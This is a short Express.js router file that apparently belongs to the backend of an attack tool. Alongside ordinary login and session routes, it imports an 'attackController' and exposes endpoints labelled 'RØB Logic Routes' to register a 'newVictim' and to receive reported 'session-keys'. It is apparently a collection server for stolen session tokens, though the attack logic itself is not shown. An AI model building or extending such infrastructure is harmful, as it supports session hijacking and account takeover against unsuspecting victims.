import express from 'express';
import { register, login, logout, checkSession } from '../controllers/authController.js';
import { newVictim, reportSessionKey } from '../controllers/attackController.js';

const router = express.Router();

// Auth Routes
router.post('/auth/register', register);
router.post('/auth/login', login);
router.post('/auth/logout', logout);
router.get('/auth/check', checkSession);

// RØB Logic Routes
router.post('/new', newVictim); // Keep for backward compatibility
router.post('/session-keys', reportSessionKey);

router.get('/health', (req, res) => res.json({ ok: true }));

export default router;